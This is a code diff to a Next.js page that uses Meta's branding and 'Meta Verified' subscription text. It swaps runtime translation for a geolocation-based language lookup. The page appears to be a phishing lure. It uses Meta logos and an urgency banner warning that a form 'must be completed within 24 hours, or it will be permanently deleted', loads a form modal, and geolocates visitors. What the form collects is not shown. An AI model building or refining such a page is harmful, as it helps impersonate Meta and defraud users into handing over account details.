@@ -1,9 +1,9 @@
 'use client';
 import { store } from '@/store/store';
-import translateText from '@/utils/translate';
+import { getTranslations } from '@/utils/translate';
 import axios from 'axios';
 import dynamic from 'next/dynamic';
-import { useEffect, useRef, useState, type FC } from 'react';
+import { useEffect, useMemo, useState, type FC } from 'react';
 import Image from 'next/image';
 import MetaBanner from '@/assets/images/imagemeta.webp';
 import MetaLogo from '@/assets/images/unnamedmeta.png';
@@ -11,12 +11,26 @@ import MetaBanner1 from '@/assets/images/imagemeta1.webp';
 
 const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });
 
+// Country code to language mapping
+const countryToLanguage: Record<string, string> = {
+    VN: 'vi',
+    US: 'en',
+    GB: 'en',
+    CA: 'en',
+    AU: 'en',
+    // ... add more countries as needed, default is en
+};
 
 const Page: FC = () => {
     const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
-    const [translations, setTranslations] = useState<Record<string, string>>({});
     const [modalKey, setModalKey] = useState(0);
-    const isTranslatingRef = useRef(false);
+
+    // Compute translations instantly without setState
+    const translations = useMemo(() => {
+        if (!geoInfo) return {};
+        const lang = countryToLanguage[geoInfo.country_code] || 'en';
+        return getTranslations(lang);
+    }, [geoInfo]);
 
     const t = (text: string): string => {
         return translations[text] || text;
@@ -49,47 +63,6 @@ const Page: FC = () => {
         };
         fetchGeoInfo();
     }, [setGeoInfo, geoInfo]);
-
-    useEffect(() => {
-        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;
-
-        isTranslatingRef.current = true;
-
-        const textsToTranslate = [
-            // Banner
-            'Upgrade your profile with Meta Verified — enjoy exclusive benefits.',
-            'This form must be completed within 24 hours, or it will be permanently deleted.',            
-            // Main content
-            'Protect your brand with Meta Verified',
-            'Meta Verified Logo',
-            'Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.',
-            'Subscribe on Page',
-            'Subscribe on Instagram',
-            'Are you a business?',
-            'Get more information on',
-            'Meta Verified for businesses',
-            'Features, availability and pricing may vary by region and app.',
-            'Meta Verified Example',
-            'Meta Verified benefits',
-            'Verified badge',
-            'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
-            'Impersonation protection',
-            'Enhanced support',
-            'Upgraded profile features',
-        ];
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo, translations]);
 
     return (
         <div className="w-full flex flex-col bg-gradient-to-br from-[#f3e7e9] via-[#c7e0f7] to-[#6ec6f7] min-h-screen" style={{margin:0,padding:0}}>
